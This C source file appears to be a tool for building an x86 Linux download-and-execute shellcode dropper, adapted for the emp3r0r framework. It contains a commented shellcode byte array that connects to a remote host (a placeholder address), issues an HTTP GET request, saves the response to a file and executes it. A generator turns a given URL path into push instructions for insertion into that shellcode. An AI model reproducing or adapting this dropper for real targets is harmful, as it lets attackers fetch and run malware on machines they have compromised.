/*
 * gen_httpreq.c, utility for generating HTTP/1.x requests for shellcodes
 * EDITED by jm33-ng: generate shellcode for emp3r0r as a dropper
 *
 * SIZES: 
 *
 * 	HTTP/1.0 header request size - 18 bytes+
 * 	HTTP/1.1 header request size - 26 bytes+
 *
 * NOTE: The length of the selected HTTP header is stored at EDX register. 
 *       Thus the generated MOV instruction (to EDX/DX/DL) is size-based. 
 *
 * - Itzik Kotler <ik@ikotler.org>
 */

#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define X86_PUSH \
    0x68

#define X86_MOV_TO_DL(x) \
    printf("\t\"\\xb2\\x%02x\"\n", x & 0xFF);

#define X86_MOV_TO_DX(x)                       \
    printf("\t\"\\x66\\xba\\x%02x\\x%02x\"\n", \
        (x & 0xFF), ((x >> 8) & 0xFF));

#define X86_MOV_TO_EDX(x)                               \
    printf("\t\"\\xba\\x%02x\\x%02x\\x%02x\\x%02x\"\n", \
        (x & 0xFF), ((x >> 8) & 0xFF), ((x >> 16) & 0xFF), ((x >> 24) & 0xFF));

char shellcode[] =

    "\x6a\x66"             // push $0x66
    "\x58"                 // pop %eax
    "\x99"                 // cltd
    "\x6a\x01"             // push $0x1
    "\x5b"                 // pop %ebx
    "\x52"                 // push %edx
    "\x53"                 // push %ebx
    "\x6a\x02"             // push $0x2
    "\x89\xe1"             // mov %esp,%ecx
    "\xcd\x80"             // int $0x80
    "\x5b"                 // pop %ebx
    "\x5e"                 // pop %esi
    "\x68\xef\xbe\xad\xde" // [1*] push $0xdeadbeef
    "\xbd\xfd\xff\xff\xaf" // [2*] mov $0xaffffffd,%ebp
    "\xf7\xd5"             // not %ebp
    "\x55"                 // push %ebp
    "\x43"                 // inc %ebx
    "\x6a\x10"             // push $0x10
    "\x51"                 // push %ecx
    "\x50"                 // push %eax
    "\xb0\x66"             // mov $0x66,%al
    "\x89\xe1"             // mov %esp,%ecx
    "\xcd\x80"             // int $0x80
    "\x5f"                 // pop %edi
    "\xb0\x08"             // mov $0x8,%al
    "\x52"                 // push %edx
    "\x6a\x41"             // push $0x41
    "\x89\xe3"             // mov %esp,%ebx
    "\x50"                 // push %eax
    "\x59"                 // pop %ecx
    "\xcd\x80"             // int $0x80
    "\x96"                 // xchg %eax,%esi
    "\x87\xdf"             // xchg %ebx,%edi

    //
    // <paste here the code, that gen_httpreq.c outputs!>
    //

    "\xb0\x04" // mov $0x4,%al

    //
    // <_send_http_request>:
    //

    "\x89\xe1" // mov %esp,%ecx
    "\xcd\x80" // int $0x80
    "\x99"     // cltd
    "\x42"     // inc %edx

    //
    // <_wait_for_dbl_crlf>:
    //

    "\x49"                     // dec %ecx
    "\xb0\x03"                 // mov $0x3,%al
    "\xcd\x80"                 // int $0x80
    "\x81\x39\x0a\x0d\x0a\x0d" // cmpl $0xd0a0d0a,(%ecx)
    "\x75\xf3"                 // jne <_wait_for_dbl_crlf>
    "\xb2\x04"                 // mov $0x4,%dl

    //
    // <_dump_loop_do_read>:
    //

    "\xb0\x03" // mov $0x3,%al
    "\xf8"     // clc

    //
    // <_dump_loop_do_write>:
    //

    "\xcd\x80"  // int $0x80
    "\x87\xde"  // xchg %ebx,%esi
    "\x72\xf7"  // jb <_dump_loop_do_read>
    "\x85\xc0"  // test %eax,%eax
    "\x74\x05"  // je <_close_file>
    "\xb0\x04"  // mov $0x4,%al
    "\xf9"      // stc
    "\xeb\xf1"  // jmp <_dump_loop_do_write>
    "\xb0\x06"  // mov $0x6,%al
    "\xcd\x80"  // int $0x80
    "\x99"      // cltd
    "\xb0\x0b"  // mov $0xb,%al
    "\x89\xfb"  // mov %edi,%ebx
    "\x52"      // push %edx
    "\x53"      // push %ebx
    "\xeb\xcc"; // jmp <_send_http_request>

void usage(char*);
int printx(char* fmt, ...);

int main(int argc, char** argv)
{

    if (argc < 2) {
        usage(argv[0]);
        return -1;
    }

    if (argv[2][0] != '/') {

        fprintf(stderr, "filename must begin with '/' as any sane URL! (e.g. /index.html)\n");

        return -1;
    }

    if (!strcmp(argv[1], "-0")) {

        return printx("GET %s HTTP/1.0\r\n\r\n", argv[2]);
    }

    if (!strcmp(argv[1], "-1")) {

        if (argc != 4) {

            fprintf(stderr, "missing <host>, required parameter for HTTP/1.1 header! (e.g. www.tty64.org)\n");

            return -1;
        }

        return printx("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", argv[2], argv[3]);
    }

    fprintf(stderr, "%s: unknown http protocol, try -0 or -1\n", argv[1]);

    return -1;
}

/*
 * usage, display usage screen
 * * basename, barrowed argv[0]
 */

void usage(char* basename)
{

    printf(
        "usage: %s <-0|-1> <filename> [<host>]\n\n"
        "\t -0, HTTP/1.0 GET request\n"
        "\t -1, HTTP/1.1 GET request\n"
        "\t <filename>, given filename (e.g. /shellcode.bin)\n"
        "\t <host>, given hostname (e.g. www.tty64.org) [required for HTTP 1.1]\n\n",
        basename);

    return;
}

/*
 * printx, fmt string. generate the shellcode chunk
 * * fmt, given format string
 */

int printx(char* fmt, ...)
{
    va_list ap;
    char buf[256], pad_buf[4], *w_buf;
    int pad_length, buf_length, i, tot_length;

    memset(buf, 0x0, sizeof(buf));

    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    buf_length = strlen(buf);

    /* printf("\nURL: %s\n", buf); */
    /* printf("Header Length: %d bytes\n", buf_length); */

    for (i = 1; buf_length > (i * 4); i++) {
        pad_length = ((i + 1) * 4) - buf_length;
    }

    /* printf("Padding Length: %d bytes\n\n", pad_length); */

    tot_length = buf_length + pad_length;

    w_buf = buf;

    if (pad_length) {

        w_buf = calloc(tot_length, sizeof(char));

        if (!w_buf) {

            perror("calloc");
            return -1;
        }

        i = index(buf, '/') - buf;

        memset(pad_buf, 0x2f, sizeof(pad_buf));

        memcpy(w_buf, buf, i);
        memcpy(w_buf + i, pad_buf, pad_length);
        memcpy(w_buf + pad_length + i, buf + i, buf_length - i);
    }

    for (i = tot_length - 1; i > -1; i -= 4) {

        /* printf("\t\"\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\" // pushl $0x%02x%02x%02x%02x\n", */
        /*     X86_PUSH, w_buf[i - 3], w_buf[i - 2], w_buf[i - 1], w_buf[i], w_buf[i - 3], w_buf[i - 2], w_buf[i - 1], w_buf[i]); */
        printf("pushl $0x%02x%02x%02x%02x\n",
            w_buf[i - 3], w_buf[i - 2], w_buf[i - 1], w_buf[i]);
    }

    if (pad_length) {
        free(w_buf);
    }

    //
    // The EDX register is assumed to be zero-out within the shellcode.
    //
    /*  */
    /* if (tot_length < 256) { */
    /*  */
    /*     // 8bit value */
    /*  */
    /*     X86_MOV_TO_DL(tot_length); */
    /*  */
    /* } else if (tot_length < 655356) { */
    /*  */
    /*     // 16bit value */
    /*  */
    /*     X86_MOV_TO_DX(tot_length); */
    /*  */
    /* } else { */
    /*  */
    /*     // 32bit value, rarely but possible ;-) */
    /*  */
    /*     X86_MOV_TO_EDX(tot_length); */
    /* } */

    fputs("\n", stdout);

    return 1;
}
